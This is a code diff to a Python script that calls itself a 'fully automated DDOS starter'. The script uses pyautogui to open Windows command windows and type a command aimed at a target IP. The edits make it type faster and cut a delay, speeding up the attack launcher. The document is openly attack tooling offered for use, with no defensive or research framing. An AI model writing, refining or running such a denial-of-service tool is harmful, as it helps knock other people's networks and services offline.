@@ -1,7 +1,6 @@
-# Hydra
+# Hydra GUI v1.3b
 # A fully automated DDOS starter for Python
 
-# GUI Edition
 
 import pyautogui     # Make sure you have me! If not, do pip install pyautogui
 import time
@@ -30,15 +29,12 @@ def do(IP_TO_DDOS, CMDS_TO_OPEN):
         
         pyautogui.hotkey("winleft", "r")
         
-        pyautogui.press("C")
-        pyautogui.press("M")
-        pyautogui.press("D")
+        pyautogui.typewrite("cmd")
         pyautogui.press("enter")
         
-        time.sleep(1)
+        time.sleep(0.2)
         
-        for i in range(0, len(commandString)):
-            pyautogui.press(commandString[i])
+        pyautogui.typewrite(commandString)
             
         pyautogui.press("enter")
 
